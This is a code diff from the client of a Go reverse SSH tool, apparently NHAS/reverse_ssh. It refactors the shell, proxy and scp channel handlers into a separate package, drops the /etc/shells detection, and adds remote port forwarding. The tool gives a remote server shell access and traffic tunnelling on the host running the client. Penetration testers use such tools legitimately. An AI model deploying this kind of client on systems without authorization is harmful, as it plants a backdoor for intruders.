@@ -1,7 +1,6 @@
 package client
 
 import (
-	"bufio"
 	"bytes"
 	"fmt"
 	"io"
@@ -11,57 +10,14 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
-	"strings"
 	"time"
 
 	"github.com/NHAS/reverse_ssh/internal"
+	"github.com/NHAS/reverse_ssh/internal/client/handlers"
 	"github.com/NHAS/reverse_ssh/internal/client/keys"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
 	"golang.org/x/crypto/ssh"
 )
-
-var shells []string
-
-func loadShells() (shells []string) {
-	file, err := os.Open("/etc/shells")
-	if err == nil {
-		defer file.Close()
-		scanner := bufio.NewScanner(file)
-		for scanner.Scan() {
-			line := scanner.Text()
-
-			if len(line) > 0 && line[0] == '#' || strings.TrimSpace(line) == "" {
-				continue
-			}
-			shells = append(shells, strings.TrimSpace(line))
-		}
-	} else {
-		shells = []string{
-			"/bin/bash",
-			"/bin/sh",
-			"/bin/zsh",
-			"/bin/ash",
-		}
-
-	}
-
-	output := []string{}
-	log.Println("Detected Shells: ")
-	for _, s := range shells {
-
-		if stats, err := os.Stat(s); err != nil && (os.IsNotExist(err) || !stats.IsDir()) {
-
-			fmt.Printf("Rejecting Shell: '%s' Reason: %v\n", s, err)
-			continue
-
-		}
-		output = append(output, s)
-		fmt.Println("\t\t", s)
-	}
-
-	return output
-
-}
 
 func WriteHTTPReq(lines []string, conn net.Conn) error {
 	lines = append(lines, "") // Add an empty line for completing the HTTP request
@@ -135,10 +91,6 @@ func Run(addr, serverPubKey, proxyAddr string, reconnect bool) {
 		log.Fatal("Getting private key failed: ", sysinfoError)
 	}
 
-	if runtime.GOOS != "windows" {
-		shells = loadShells()
-	}
-
 	l := logger.NewLog("client")
 
 	var username string
@@ -210,6 +162,8 @@ func Run(addr, serverPubKey, proxyAddr string, reconnect bool) {
 		go func(in <-chan *ssh.Request) {
 			for r := range in {
 				switch r.Type {
+				case "tcpip-forward":
+					go handlers.StartRemoteForward(r, sshConn)
 				case "kill":
 					l.Info("Kill command sent, dying")
 					os.Exit(0)
@@ -228,9 +182,9 @@ func Run(addr, serverPubKey, proxyAddr string, reconnect bool) {
 		}
 
 		err = internal.RegisterChannelCallbacks(user, chans, l, map[string]internal.ChannelHandler{
-			"session":      shellChannel,
-			"direct-tcpip": proxyChannel,
-			"scp":          scpChannel,
+			"session":      handlers.Shell,
+			"direct-tcpip": handlers.Proxy,
+			"scp":          handlers.Scp,
 		})
 		if err != nil {
 			log.Printf("Server disconnected unexpectedly: %s\n", err)
